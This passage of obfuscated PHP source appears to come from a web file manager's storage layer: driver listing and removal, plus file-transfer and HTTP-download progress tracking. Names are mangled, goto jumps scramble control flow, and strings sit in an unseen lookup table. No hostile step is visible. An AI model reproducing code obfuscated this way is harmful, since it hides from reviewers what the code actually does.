isset($A„Îù¤Š[$f”‡—…Ïª’]) ? $A„Îù¤Š[$f”‡—…Ïª’] : ucfirst($f”‡—…Ïª’); $Dâ³Î…Œ½§ = $Fë…—…Ş»†[71] . $cİÖ—‹Æ¥Ô; if (!$cİÖ—‹Æ¥Ô || !class_exists($Dâ³Î…Œ½§)) { write_log(array($Fë…—…Ş»†[1970], $DÂ ê¯ö¿‚, get_caller_info()), $Fë…—…Ş»†[1971]); show_json(LNG($Fë…—…Ş»†[1972]), !1, $DÂ ê¯ö¿‚); } goto Dö¦¨Å‰›•; béÔÜ²Ü”: $Då™˜´Ú = $F‡«‚„¡Ç¡->getPath($C•Ëçª¸¼» . $Fë…—…Ş»†[1115]); if (!$F‡«‚„¡Ç¡->mkfile($Då™˜´Ú)) { show_json(LNG($Fë…—…Ş»†[1973]), !1); } $D·ÊŒ…‘Ú[$Fë…—…Ş»†[1054]] = $C•Ëçª¸¼»; goto e‰®Óàª‘–; CößåÊÍµ•: } public function driverListSystem() { $EŞ›˜ğ¨“ =& $_SERVER[¹…ÕÄ]; $cŒ¦ãïÈîä = parent::listData(); $AÍÙÓí‰š¼ = array(); foreach ($cŒ¦ãïÈîä as $cˆ½·†ó÷ì) { unset($cˆ½·†ó÷ì[$EŞ›˜ğ¨“[192]], $cˆ½·†ó÷ì[$EŞ›˜ğ¨“[83]]); $cˆ½·†ó÷ì[$EŞ›˜ğ¨“[6]] = json_decode($cˆ½·†ó÷ì[$EŞ›˜ğ¨“[6]], !0); $AÍÙÓí‰š¼[] = $cˆ½·†ó÷ì; } return $AÍÙÓí‰š¼; } public function defaultDriver() { $dâ£‡™Ñ¯ =& $_SERVER[¹…ÕÄ]; $F› ¬´ª—§ = parent::listData(); $bÉ¹¶‹ì÷ = array_filter_by_field($F› ¬´ª—§, $dâ£‡™Ñ¯[34], 1); $bÉ¹¶‹ì÷ = $bÉ¹¶‹ì÷[0]; if ($bÉ¹¶‹ì÷) { $bÉ¹¶‹ì÷[$dâ£‡™Ñ¯[6]] = json_decode($bÉ¹¶‹ì÷[$dâ£‡™Ñ¯[6]], !0); } return $bÉ¹¶‹ì÷; } public function driverInfo($fó¢¸æÛ£) { $fò»³«¡ô =& $_SERVER[¹…ÕÄ]; $EÕ©£Íõœ› = array_to_keyvalue(parent::listData(), $fò»³«¡ô[388]); if (!isset($EÕ©£Íõœ›[$fó¢¸æÛ£])) { return !1; } $a·‰«Ç…ÇŸ = $EÕ©£Íõœ›[$fó¢¸æÛ£]; $a·‰«Ç…ÇŸ[$fò»³«¡ô[6]] = json_decode($a·‰«Ç…ÇŸ[$fò»³«¡ô[6]], !0); return $a·‰«Ç…ÇŸ; } public function remove($Cáöê•á˜—) { $this->removeShareItems($Cáöê•á˜—); return parent::remove($Cáöê•á˜—); } public function removeWithFile($bÅ·Õğ¨œ‡, $eíì¯‡Ü…) { goto A«øîïÛ¸…; cƒÕ¦ï«Ê: if (!$cÑÇ„ºÌÏ) { $A¸Ô»šÕô³->stop($cµë‰¯Ì¬°); return !1; } $A¸Ô»šÕô³->end(); if ($eíì¯‡Ü… == $d»¿£ñÅ†œ[1633]) { $this->remove($bÅ·Õğ¨œ‡); } goto CÌß·ÆÌ×•; CĞ¥íî„ó : $A¸Ô»šÕô³->task[$d»¿£ñÅ†œ[714]] = (double) $d¯ù·ÒÚÅÌ; $a¸ÑœôàÁ = KodIO::defaultDriver(); $f…¬‘Ääï» = $a¸ÑœôàÁ[$d»¿£ñÅ†œ[388]]; goto D¹ô½Åõ; D¹ô½Åõ: $f´Ô àÌŠ = "\173\x69\157\72{$f…¬‘Ääï»}\x7d\57"; $cÑÇ„ºÌÏ = !0; $CÔæêßƒ”¯ = array(); goto d­ó¶ˆ¡§†; A«øîïÛ¸…: $d»¿£ñÅ†œ =& $_SERVER[¹…ÕÄ]; $eŒµÓ‹÷ = array($d»¿£ñÅ†œ[763] => $bÅ·Õğ¨œ‡); $AŸ…·›Êàá = Model($d»¿£ñÅ†œ[444])->where($eŒµÓ‹÷)->count(); goto FëÆ±¿»×; FëÆ±¿»×: $d¯ù·ÒÚÅÌ = Model($d»¿£ñÅ†œ[444])->where($eŒµÓ‹÷)->sum($d»¿£ñÅ†œ[77]); $cµë‰¯Ì¬° = $eíì¯‡Ü… . $d»¿£ñÅ†œ[1976] . $bÅ·Õğ¨œ‡; $A¸Ô»šÕô³ = new TaskFileTransfer($cµë‰¯Ì¬°, $d»¿£ñÅ†œ[1971], $AŸ…·›Êàá, LNG($d»¿£ñÅ†œ[1977]) . "\x28{$bÅ·Õğ¨œ‡}\x29"); goto CĞ¥íî„ó ; d­ó¶ˆ¡§†: $a¹Áä»²†™ = Model($d»¿£ñÅ†œ[173])->where($eŒµÓ‹÷)->field($d»¿£ñÅ†œ[1978])->select(); foreach ($a¹Áä»²†™ as $FèÜ‰åÇ£ô) { goto fÁöÌ¼İ¨; E…Œ†ÕÒçÍ: $b¾¥æ¸íÇŠ = array($d»¿£ñÅ†œ[763] => $f…¬‘Ääï», $d»¿£ñÅ†œ[75] => $bØ™­óÜ’÷); Model($d»¿£ñÅ†œ[173])->where($eŒµÓ‹÷)->save($b¾¥æ¸íÇŠ); goto dí‚Ï¹ƒ‹¤; fÁöÌ¼İ¨: $c¶ÎˆôùÏ = $FèÜ‰åÇ£ô[$d»¿£ñÅ†œ[75]]; $bØ™­óÜ’÷ = $f´Ô àÌŠ . str_replace("\x7b\151\157\x3a{$bÅ·Õğ¨œ‡}\x7d\57", $d»¿£ñÅ†œ[33], $c¶ÎˆôùÏ); if (!IO::exist($c¶ÎˆôùÏ)) { $CÔæêßƒ”¯[] = $FèÜ‰åÇ£ô[$d»¿£ñÅ†œ[441]]; $A¸Ô»šÕô³->updateFileEnd($FèÜ‰åÇ£ô[$d»¿£ñÅ†œ[28]], $FèÜ‰åÇ£ô[$d»¿£ñÅ†œ[77]]); continue; } goto dÆùé‘è¬; dÆùé‘è¬: if (IO::exist($bØ™­óÜ’÷)) { $A¸Ô»šÕô³->updateFileEnd($FèÜ‰åÇ£ô[$d»¿£ñÅ†œ[28]], $FèÜ‰åÇ£ô[$d»¿£ñÅ†œ[77]]); continue; } if (!IO::move($c¶ÎˆôùÏ, get_path_father($bØ™­óÜ’÷))) { $cÑÇ„ºÌÏ = !1; break; } $eŒµÓ‹÷ = array($d»¿£ñÅ†œ[441] => $FèÜ‰åÇ£ô[$d»¿£ñÅ†œ[441]]); goto E…Œ†ÕÒçÍ; dí‚Ï¹ƒ‹¤: } $this->removeByFileID($CÔæêßƒ”¯); goto cƒÕ¦ï«Ê; CÌß·ÆÌ×•: } public function progress($Fğè²µ‹À¢, $fã‚‘Ú‰®Ú) { return Task::get($fã‚‘Ú‰®Ú . $_SERVER[¹…ÕÄ][1976] . $Fğè²µ‹À¢); } private function removeByFileID($föÓßÔŒÒ† = array()) { goto aÁµÔ ‚ïŸ; EŒªº¾£Ğ­: foreach ($D…¡ŒÛ’”« as $FŞ‰±£Íšó) { Model($fê°•¦ˆğ[403])->removeNow($FŞ‰±£Íšó, !1); } goto Bòƒ ®¢ŸÔ; aÌ‘²çöá: $D…¡ŒÛ’”« = Model($fê°•¦ˆğ[1183])->where($D×®æ½¥Òç)->field($fê°•¦ˆğ[390])->select(); if (!$D…¡ŒÛ’”«) { return; } $D…¡ŒÛ’”« = array_to_keyvalue($D…¡ŒÛ’”«, $fê°•¦ˆğ[33], $fê°•¦ˆğ[390]); goto EŒªº¾£Ğ­; aÁµÔ ‚ïŸ: $fê°•¦ˆğ =& $_SERVER[¹…ÕÄ]; if (empty($föÓßÔŒÒ†)) { return; } $D×®æ½¥Òç = array($fê°•¦ˆğ[441] => array($fê°•¦ˆğ[7], $föÓßÔŒÒ†)); goto aÌ‘²çöá; Bòƒ ®¢ŸÔ: } private function removeShareItems($a¬‘íÛõ“ì) { goto C¬ƒÜ½à‚; C¬ƒÜ½à‚: $a¯Ä¹óÔˆ =& $_SERVER[¹…ÕÄ]; $BôôôÉÂ†Ã = "\x7b\x69\x6f\x3a{$a¬‘íÛõ“ì}\x7d\57"; $BƒãøèŠŞ = array($a¯Ä¹óÔˆ[390] => 0, $a¯Ä¹óÔˆ[1049] => array($a¯Ä¹óÔˆ[378], "{$BôôôÉÂ†Ã}\x25")); goto d¨ÌÜ¼ø’•; d¨ÌÜ¼ø’•: $Eè¿îçÀ¨· = Model($a¯Ä¹óÔˆ[1644])->where($BƒãøèŠŞ)->field($a¯Ä¹óÔˆ[462])->select(); if (empty($Eè¿îçÀ¨·)) { return; } $C¯ƒÌ³¤ê‹ = array_to_keyvalue($Eè¿îçÀ¨·, $a¯Ä¹óÔˆ[33], $a¯Ä¹óÔˆ[462]); goto fÔ„¡÷²Ëù; fÔ„¡÷²Ëù: Model($a¯Ä¹óÔˆ[558])->remove($C¯ƒÌ³¤ê‹); goto A£ğÛ¯·‡Á; A£ğÛ¯·‡Á: } } goto c±±½‡Ë¡; EøìÖßÉ°¶: class TaskFileTransfer extends Task { protected function startAfter() { goto C¾ÊÆµ§ùÇ; dô²”×Çïì: Hook::bind($f°ô‘øØ£¬[561], array($this, $f°ô‘øØ£¬[1532])); Hook::bind($f°ô‘øØ£¬[562], array($this, $f°ô‘øØ£¬[1533])); Hook::bind($f°ô‘øØ£¬[564], array($this, $f°ô‘øØ£¬[1534])); goto c¯ªØ”³¤›; d«ùâóƒÍ: Hook::bind($f°ô‘øØ£¬[1539], array($this, $f°ô‘øØ£¬[1540])); Hook::bind($f°ô‘øØ£¬[1541], array($this, $f°ô‘øØ£¬[1542])); Hook::bind($f°ô‘øØ£¬[1543], array($this, $f°ô‘øØ£¬[1544])); goto eå÷®İÑ·Š; eå÷®İÑ·Š: $EÂ…†¢”†º[$f°ô‘øØ£¬[1545]] = LNG($f°ô‘øØ£¬[1546]); $EÂ…†¢”†º[$f°ô‘øØ£¬[1547]] = 0; $EÂ…†¢”†º[$f°ô‘øØ£¬[1548]] = 0; goto eõ¶š¹°ÆŸ; c¯ªØ”³¤›: Hook::bind($f°ô‘øØ£¬[565], array($this, $f°ô‘øØ£¬[1534])); Hook::bind($f°ô‘øØ£¬[532], array($this, $f°ô‘øØ£¬[1535])); Hook::bind($f°ô‘øØ£¬[529], array($this, $f°ô‘øØ£¬[1535])); goto d„–—éõÏâ; d‰è´Ò«ªŸ: Hook::bind($f°ô‘øØ£¬[1527], array($this, $f°ô‘øØ£¬[1528])); Hook::bind($f°ô‘øØ£¬[1087], array($this, $f°ô‘øØ£¬[1529])); Hook::bind($f°ô‘øØ£¬[1530], array($this, $f°ô‘øØ£¬[1531])); goto dô²”×Çïì; DŞÅâ±¯ğ†: $EÂ…†¢”†º[$f°ô‘øØ£¬[1551]] = 0; $EÂ…†¢”†º[$f°ô‘øØ£¬[1552]] = 0; if (!$EÂ…†¢”†º[$f°ô‘øØ£¬[1409]]) { $EÂ…†¢”†º[$f°ô‘øØ£¬[1409]] = LNG($f°ô‘øØ£¬[1553]); } goto BÉöŒ¤²ß»; C´òÚŒ ‡¶: Hook::bind($f°ô‘øØ£¬[1536], array($this, $f°ô‘øØ£¬[1537])); Hook::bind($f°ô‘øØ£¬[554], array($this, $f°ô‘øØ£¬[1538])); $this->sourceModelCopyFlag = !1; goto d«ùâóƒÍ; eõ¶š¹°ÆŸ: $EÂ…†¢”†º[$f°ô‘øØ£¬[1002]] = $f°ô‘øØ£¬[33]; $EÂ…†¢”†º[$f°ô‘øØ£¬[1549]] = $f°ô‘øØ£¬[33]; $EÂ…†¢”†º[$f°ô‘øØ£¬[1550]] = 0; goto DŞÅâ±¯ğ†; d„–—éõÏâ: Hook::bind($f°ô‘øØ£¬[534], array($this, $f°ô‘øØ£¬[1535])); Hook::bind($f°ô‘øØ£¬[536], array($this, $f°ô‘øØ£¬[1535])); Hook::bind($f°ô‘øØ£¬[538], array($this, $f°ô‘øØ£¬[1535])); goto C´òÚŒ ‡¶; C¾ÊÆµ§ùÇ: $f°ô‘øØ£¬ =& $_SERVER[¹…ÕÄ]; $EÂ…†¢”†º =& $this->task; $this->sourceCopyFolder = !1; goto d‰è´Ò«ªŸ; BÉöŒ¤²ß»: } protected function endAfter() { goto cÆ£ƒßŸß; eÌĞÎµ–: Hook::unbind($fİŸŞ‹èŸ[529], array($this, $fİŸŞ‹èŸ[1535])); Hook::unbind($fİŸŞ‹èŸ[534], array($this, $fİŸŞ‹èŸ[1535])); Hook::unbind($fİŸŞ‹èŸ[536], array($this, $fİŸŞ‹èŸ[1535])); goto DõÏØ–°š; D‹ø„˜‚™: Hook::unbind($fİŸŞ‹èŸ[564], array($this, $fİŸŞ‹èŸ[1534])); Hook::unbind($fİŸŞ‹èŸ[565], array($this, $fİŸŞ‹èŸ[1534])); Hook::unbind($fİŸŞ‹èŸ[532], array($this, $fİŸŞ‹èŸ[1535])); goto eÌĞÎµ–; DÅ»ì¾÷¢‡: Hook::unbind($fİŸŞ‹èŸ[1530], array($this, $fİŸŞ‹èŸ[1531])); Hook::unbind($fİŸŞ‹èŸ[561], array($this, $fİŸŞ‹èŸ[1532])); Hook::unbind($fİŸŞ‹èŸ[562], array($this, $fİŸŞ‹èŸ[1533])); goto D‹ø„˜‚™; cÆ£ƒßŸß: $fİŸŞ‹èŸ =& $_SERVER[¹…ÕÄ]; Hook::unbind($fİŸŞ‹èŸ[1527], array($this, $fİŸŞ‹èŸ[1528])); Hook::unbind($fİŸŞ‹èŸ[1087], array($this, $fİŸŞ‹èŸ[1529])); goto DÅ»ì¾÷¢‡; E…¿ÙÒ‘: Hook::unbind($fİŸŞ‹èŸ[1539], array($this, $fİŸŞ‹èŸ[1540])); Hook::unbind($fİŸŞ‹èŸ[1541], array($this, $fİŸŞ‹èŸ[1542])); Hook::unbind($fİŸŞ‹èŸ[1543], array($this, $fİŸŞ‹èŸ[1544])); goto AŠ‡Âãİ§; DõÏØ–°š: Hook::unbind($fİŸŞ‹èŸ[538], array($this, $fİŸŞ‹èŸ[1535])); Hook::unbind($fİŸŞ‹èŸ[1536], array($this, $fİŸŞ‹èŸ[1537])); Hook::unbind($fİŸŞ‹èŸ[554], array($this, $fİŸŞ‹èŸ[1538])); goto E…¿ÙÒ‘; AŠ‡Âãİ§: } public function copyMoveStart($EàÆÅÕŒŞÅ, $dÃŠ’ÒÄ, $aØ–¬šÈ°Í, $aŠº¨éêìµ) { goto f†ĞêŒäÑ±; AÁ¢±»ã­‡: if (substr($dÃŠ’ÒÄ, 0, strlen($e™„ùø­ÅÔ)) == $e™„ùø­ÅÔ) { return; } if (substr($aŠº¨éêìµ, 0, strlen($e™„ùø­ÅÔ)) == $e™„ùø­ÅÔ) { return; } $A¿¿·‚ÜŠ =& $this->task; goto A¹³ğ¹ÃÂ; A¹³ğ¹ÃÂ: $A¿¿·‚ÜŠ[$Cæ•ÎšÉ„í[1555]] = KodIO::transferType($EàÆÅÕŒŞÅ, $aØ–¬šÈ°Í); $this->update(); goto c¢ÑñÕ††; f†ĞêŒäÑ±: $Cæ•ÎšÉ„í =& $_SERVER[¹…ÕÄ]; self::log($Cæ•ÎšÉ„í[1554] . $dÃŠ’ÒÄ . $Cæ•ÎšÉ„í[66] . $aŠº¨éêìµ); $e™„ùø­ÅÔ = rtrim(TEMP_FILES, $Cæ•ÎšÉ„í[8]); goto AÁ¢±»ã­‡; c¢ÑñÕ††: } public function updateAfter() { goto fØòÄëæµÖ; eì¾ê“°§‘: if ($this->sourceModelCopyFlag) { return; } if ($E«‹÷ÚˆÏ†[$f­öÏŞè´[1555]] == $f­öÏŞè´[1160]) { return; } if ($E«‹÷ÚˆÏ†[$f­öÏŞè´[1555]] == $f­öÏŞè´[1072] || $E«‹÷ÚˆÏ†[$f­öÏŞè´[1555]] == $f­öÏŞè´[106]) { if ($E«‹÷ÚˆÏ†[$f­öÏŞè´[1549]]) { $E«‹÷ÚˆÏ†[$f­öÏŞè´[1552]] = $E«‹÷ÚˆÏ†[$f­öÏŞè´[1551]] + $E«‹÷ÚˆÏ†[$f­öÏŞè´[1548]]; } } else { if ($E«‹÷ÚˆÏ†[$f­öÏŞè´[1555]] == $f­öÏŞè´[1161]) { if ($E«‹÷ÚˆÏ†[$f­öÏŞè´[1549]] == $f­öÏŞè´[1072]) { $E«‹÷ÚˆÏ†[$f­öÏŞè´[1552]] = $E«‹÷ÚˆÏ†[$f­öÏŞè´[1551]] + $E«‹÷ÚˆÏ†[$f­öÏŞè´[1548]] * 0.5; } else { if ($E«‹÷ÚˆÏ†[$f­öÏŞè´[1549]] == $f­öÏŞè´[106]) { $E«‹÷ÚˆÏ†[$f­öÏŞè´[1552]] = $E«‹÷ÚˆÏ†[$f­öÏŞè´[1551]] + $E«‹÷ÚˆÏ†[$f­öÏŞè´[1547]] * 0.5 + $E«‹÷ÚˆÏ†[$f­öÏŞè´[1548]] * 0.5; } } } } goto DÉ·á·…ì†; fØòÄëæµÖ: $f­öÏŞè´ =& $_SERVER[¹…ÕÄ]; $E«‹÷ÚˆÏ† =& $this->task; if (!$E«‹÷ÚˆÏ†[$f­öÏŞè´[714]]) { return; } goto eì¾ê“°§‘; DÉ·á·…ì†: $E«‹÷ÚˆÏ†[$f­öÏŞè´[1505]] = $E«‹÷ÚˆÏ†[$f­öÏŞè´[1552]] / $E«‹÷ÚˆÏ†[$f­öÏŞè´[714]]; if ($E«‹÷ÚˆÏ†[$f­öÏŞè´[1505]] > 0) { $EèÍêÑ­”Œ = timeFloat() - $E«‹÷ÚˆÏ†[$f­öÏŞè´[736]] - $E«‹÷ÚˆÏ†[$f­öÏŞè´[1508]]; $E«‹÷ÚˆÏ†[$f­öÏŞè´[1509]] = $EèÍêÑ­”Œ * (1 - $E«‹÷ÚˆÏ†[$f­öÏŞè´[1505]]) / $E«‹÷ÚˆÏ†[$f­öÏŞè´[1505]]; } goto aØ““”Ğ¤; aØ““”Ğ¤: } public function addPath($A´é‡‰ÒÌ) { goto fµÂÇĞÏï; eÂ½ç˜¸‰: $dÛÑé­¯†é = IO::infoWithChildren($A´é‡‰ÒÌ); $FŸˆíÔÜĞ¨ = $C‹ŒŠÂçÊ[$eéÂƒç´Šğ[1556]] ? $C‹ŒŠÂçÊ[$eéÂƒç´Šğ[1556]][$eéÂƒç´Šğ[1557]] : 0; $C‹ŒŠÂçÊ[$eéÂƒç´Šğ[1556]] = array($eéÂƒç´Šğ[1557] => $FŸˆíÔÜĞ¨ + 1, $eéÂƒç´Šğ[407] => $dÛÑé­¯†é[$eéÂƒç´Šğ[28]], $eéÂƒç´Šğ[75] => $dÛÑé­¯†é[$eéÂƒç´Šğ[75]], $eéÂƒç´Šğ[489] => $dÛÑé­¯†é[$eéÂƒç´Šğ[489]] ? $dÛÑé­¯†é[$eéÂƒç´Šğ[489]] : $dÛÑé­¯†é[$eéÂƒç´Šğ[75]]); goto e³İ­™‘á; e³İ­™‘á: if ($dÛÑé­¯†é[$eéÂƒç´Šğ[29]] == $eéÂƒç´Šğ[173]) { $C‹ŒŠÂçÊ[$eéÂƒç´Šğ[1000]] += 1; } else { $C‹ŒŠÂçÊ[$eéÂƒç´Šğ[1000]] += $dÛÑé­¯†é[$eéÂƒç´Šğ[80]][$eéÂƒç´Šğ[78]]; if ($dÛÑé­¯†é[$eéÂƒç´Šğ[390]]) { $C‹ŒŠÂçÊ[$eéÂƒç´Šğ[1000]] += $dÛÑé­¯†é[$eéÂƒç´Šğ[80]][$eéÂƒç´Šğ[79]] + 1; } } $C‹ŒŠÂçÊ[$eéÂƒç´Šğ[714]] += $dÛÑé­¯†é[$eéÂƒç´Šğ[77]]; $this->update(); goto eô™Éà±; fµÂÇĞÏï: $eéÂƒç´Šğ =& $_SERVER[¹…ÕÄ]; if (!$A´é‡‰ÒÌ) { return; } $C‹ŒŠÂçÊ =& $this->task; goto eÂ½ç˜¸‰; eô™Éà±: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($Eöã¤’ã‡) { $f‹Ğ¿Æ­ Š =& $_SERVER[¹…ÕÄ]; $DÍæîÆØª =& $this->task; $DÍæîÆØª[$f‹Ğ¿Æ­ Š[1545]] = $Eöã¤’ã‡[$f‹Ğ¿Æ­ Š[28]]; $DÍæîÆØª[$f‹Ğ¿Æ­ Š[1002]] = $Eöã¤’ã‡[$f‹Ğ¿Æ­ Š[28]]; $this->update(); } public function copyFileStart($DîÊÂÀ¬œø, $f•ÈŒ»ñ ·, $cˆìºã‰, $e“¢ê‚Ú, $D¼‰’‹„âº, $eø¹£ÍßÅ) { goto BìƒÈ†Èåœ; aù½†Û‘†å: $GLOBALS[$f¬òÓÊø“©[1559]] = $D¼‰’‹„âº; $GLOBALS[$f¬òÓÊø“©[1558]] = $eø¹£ÍßÅ; $F¶ù·¡Ú¢è =& $this->task; goto dàº©ÎÕŞó; dàº©ÎÕŞó: $F¶ù·¡Ú¢è[$f¬òÓÊø“©[1545]] = $b‚àİ¬íÎ†; $F¶ù·¡Ú¢è[$f¬òÓÊø“©[1547]] = (int) $DîÊÂÀ¬œø->size($f•ÈŒ»ñ ·); $F¶ù·¡Ú¢è[$f¬òÓÊø“©[1548]] = 0; goto f–”Š„›‡§; BìƒÈ†Èåœ: $f¬òÓÊø“© =& $_SERVER[¹…ÕÄ]; $b‚àİ¬íÎ† = $D¼‰’‹„âº; if ($b‚àİ¬íÎ† == $GLOBALS[$f¬òÓÊø“©[1558]]) { $b‚àİ¬íÎ† = $GLOBALS[$f¬òÓÊø“©[1559]]; } goto aù½†Û‘†å; B÷…’³¢¾Œ: $this->update(); goto Aí´¢‘‰¢; f–”Š„›‡§: $F¶ù·¡Ú¢è[$f¬òÓÊø“©[1002]] = $f¬òÓÊø“©[33]; $F¶ù·¡Ú¢è[$f¬òÓÊø“©[1549]] = $f¬òÓÊø“©[33]; $F¶ù·¡Ú¢è[$f¬òÓÊø“©[1550]] = 0; goto B÷…’³¢¾Œ; Aí´¢‘‰¢: } public function copyFileEnd($D¨£„ˆ‚, $c«©…õï×†, $B¢±°·³Í“, $EŞœœèî, $aôØ˜ùõ«, $B…ƒåÓõ„ó) { $aŒùØå¥çÄ =& $_SERVER[¹…ÕÄ]; $Eœù—ã§„ =& $this->task; $Eœù—ã§„[$aŒùØå¥çÄ[1548]] = $Eœù—ã§„[$aŒùØå¥çÄ[1547]]; $Eœù—ã§„[$aŒùØå¥çÄ[1549]] = $aŒùØå¥çÄ[33]; if ($aôØ˜ùõ« == $Eœù—ã§„[$aŒùØå¥çÄ[1545]]) { $Eœù—ã§„[$aŒùØå¥çÄ[1551]] += $Eœù—ã§„[$aŒùØå¥çÄ[1547]]; $Eœù—ã§„[$aŒùØå¥çÄ[1552]] = $Eœù—ã§„[$aŒùØå¥çÄ[1551]]; $this->update(1); } else { $this->update(); $Eœù—ã§„[$aŒùØå¥çÄ[1548]] = 0; } self::log($aŒùØå¥çÄ[1560] . $c«©…õï×† . $aŒùØå¥çÄ[66] . $EŞœœèî . $aŒùØå¥çÄ[227] . $aôØ˜ùõ« . $aŒùØå¥çÄ[1561] . $Eœù—ã§„[$aŒùØå¥çÄ[1545]]); } public function updateFileEnd($bÍ×½Èº, $E×“£Øîç) { goto dÄ–Î±í©¦; E…òÒÑ¶: $this->update(1); self::log($BêìÌ›¾‹•[1562] . $bÍ×½Èº); goto a­Ö—á´ñÛ; fñó¦âŒ…: $b¢ò½¹Öå¿[$BêìÌ›¾‹•[1547]] = $E×“£Øîç; $b¢ò½¹Öå¿[$BêìÌ›¾‹•[1551]] += $E×“£Øîç; $b¢ò½¹Öå¿[$BêìÌ›¾‹•[1552]] = $b¢ò½¹Öå¿[$BêìÌ›¾‹•[1551]]; goto E…òÒÑ¶; dÄ–Î±í©¦: $BêìÌ›¾‹• =& $_SERVER[¹…ÕÄ]; $b¢ò½¹Öå¿ =& $this->task; $b¢ò½¹Öå¿[$BêìÌ›¾‹•[1545]] = $bÍ×½Èº; goto fñó¦âŒ…; a­Ö—á´ñÛ: } public function sourceModelCopy($c“¿£Í½›µ) { goto aĞ°Ó×øø”; aĞ°Ó×øø”: $dÀä¹ƒ¾ =& $_SERVER[¹…ÕÄ]; $fÈĞšƒÆ†Æ = $c“¿£Í½›µ[0]; $F´£ˆšŸãˆ = $c“¿£Í½›µ[1]; goto aœ‹Ü¥Ó•İ; fÆİØÍ­Åí: switch ($fÈĞšƒÆ†Æ) { case $dÀä¹ƒ¾[530]: $eÛÏÁç›¾Ò = 1; break; case $dÀä¹ƒ¾[533]: $DŞÎ¥°Ôİø[$dÀä¹ƒ¾[1545]] = $F´£ˆšŸãˆ[$dÀä¹ƒ¾[28]]; break; case $dÀä¹ƒ¾[535]: $eÛÏÁç›¾Ò = intval($c“¿£Í½›µ[$dÀä¹ƒ¾[375]] * 0.4); break; case $dÀä¹ƒ¾[537]: $eÛÏÁç›¾Ò = intval($c“¿£Í½›µ[$dÀä¹ƒ¾[375]] * 0.2); break; case $dÀä¹ƒ¾[539]: $eÛÏÁç›¾Ò = intval($c“¿£Í½›µ[$dÀä¹ƒ¾[375]] * 0.4); break; } $this->update($eÛÏÁç›¾Ò); $this->sourceModelCopyFlag = !1; goto Cƒ˜ÕÇÈ—; aœ‹Ü¥Ó•İ: $DŞÎ¥°Ôİø =& $this->task; $this->sourceModelCopyFlag = !0; $eÛÏÁç›¾Ò = 0; goto fÆİØÍ­Åí; Cƒ˜ÕÇÈ—: } public function sourceRemove($aÔ…¸õÃƒ, $F’ï‹Ú¦Ò) { $bÄ­ïÜë‘ =& $_SERVER[¹…ÕÄ]; $this->sourceModelCopyFlag = !0; $D¥ïÈ‰ÌÚæ = 1; if (isset($aÔ…¸õÃƒ[$bÄ­ïÜë‘[80]])) { $D¥ïÈ‰ÌÚæ = $aÔ…¸õÃƒ[$bÄ­ïÜë‘[80]][$bÄ­ïÜë‘[78]] + $aÔ…¸õÃƒ[$bÄ­ïÜë‘[80]][$bÄ­ïÜë‘[79]] + 1; } $this->update($D¥ïÈ‰ÌÚæ); $this->sourceModelCopyFlag = !1; } public function sourceMove($DŸäÊñì†ë) { $this->sourceRemove($DŸäÊñì†ë, !1); } public function curlProgress($a‡â„éÉ…š, $Fì„ÕëÛæ, $fó¾ø°óÄ, $Bè„ì®Àš, $aÖƒ¼‹œÔ) { $BÇ˜ô¡ˆ =& $_SERVER[¹…ÕÄ]; $CøæÙª…Èƒ =& $this->task; if ($aÖƒ¼‹œÔ > 0) { $CøæÙª…Èƒ[$BÇ˜ô¡ˆ[1002]] = $BÇ˜ô¡ˆ[1563]; $CøæÙª…Èƒ[$BÇ˜ô¡ˆ[1549]] = $BÇ˜ô¡ˆ[106]; if ($CøæÙª…Èƒ[$BÇ˜ô¡ˆ[1547]]) { $CøæÙª…Èƒ[$BÇ˜ô¡ˆ[1548]] = $aÖƒ¼‹œÔ; } if ($CøæÙª…Èƒ[$BÇ˜ô¡ˆ[1550]]) { $CøæÙª…Èƒ[$BÇ˜ô¡ˆ[1548]] = $aÖƒ¼‹œÔ + $CøæÙª…Èƒ[$BÇ˜ô¡ˆ[1550]]; } } else { if ($fó¾ø°óÄ > 0) { if ($CøæÙª…Èƒ[$BÇ˜ô¡ˆ[1547]] == $Fì„ÕëÛæ) { $CøæÙª…Èƒ[$BÇ˜ô¡ˆ[1548]] = $fó¾ø°óÄ; $CøæÙª…Èƒ[$BÇ˜ô¡ˆ[1002]] = $BÇ˜ô¡ˆ[1564]; $CøæÙª…Èƒ[$BÇ˜ô¡ˆ[1549]] = $BÇ˜ô¡ˆ[1072]; } } } $this->update(); } public function curlProgressStart($b‚ˆ›–Š©‰) { } public function curlProgressEnd($bóÊ‰‡Ï¤) { goto B§ƒğÛÕÖ; c×òĞ‘¡¥Ì: $this->update(); goto CË†µºã; B§ƒğÛÕÖ: $eÔ”ÀÀÅ©† =& $_SERVER[¹…ÕÄ]; $B³çó¶°– =& $this->task; $a³ï®Ï…ÄÕ = curl_getinfo($bóÊ‰‡Ï¤); goto E²£ºœñœ; E²£ºœñœ: $FìƒìóÕ¸§ = $a³ï®Ï…ÄÕ[$eÔ”ÀÀÅ©†[1565]]; if ($FìƒìóÕ¸§ == -1) { $FìƒìóÕ¸§ = $a³ï®Ï…ÄÕ[$eÔ”ÀÀÅ©†[1566]]; } if ($B³çó¶°–[$eÔ”ÀÀÅ©†[1549]] == $eÔ”ÀÀÅ©†[106] && $FìƒìóÕ¸§) { $B³çó¶°–[$eÔ”ÀÀÅ©†[1550]] += $FìƒìóÕ¸§; } goto c×òĞ‘¡¥Ì; CË†µºã: } } class TaskHttp extends Task { protected function startAfter() { $a¡±”—¡µŞ =& $_SERVER[¹…ÕÄ]; $eó¼óÓ’ê =& $this->task; $eó¼óÓ’ê[$a¡±”—¡µŞ[1567]] = 1; Hook::bind($a¡±”—¡µŞ[1539], array($this, $a¡±”—¡µŞ[1568])); Hook::bind($a¡±”—¡µŞ[1541], array($this, $a¡±”—¡µŞ[1569])); Hook::bind($a¡±”—¡µŞ[1543], array($this, $a¡±”—¡µŞ[1570])); } protected function endAfter() { $D»ÜŒ§¾† =& $_SERVER[¹…ÕÄ]; Hook::unbind($D»ÜŒ§¾†[1539], array($this, $D»ÜŒ§¾†[1568])); Hook::unbind($D»ÜŒ§¾†[1541], array($this, $D»ÜŒ§¾†[1569])); Hook::unbind($D»ÜŒ§¾†[1543], array($this, $D»ÜŒ§¾†[1570])); } public function progressStart($eƒ†ÈÖÂ•¬) { $DÊ˜¸¼¬Õ¡ =& $_SERVER[¹…ÕÄ]; $E•©òòŠ’ = curl_getinfo($eƒ†ÈÖÂ•¬); self::log($DÊ˜¸¼¬Õ¡[1571] . 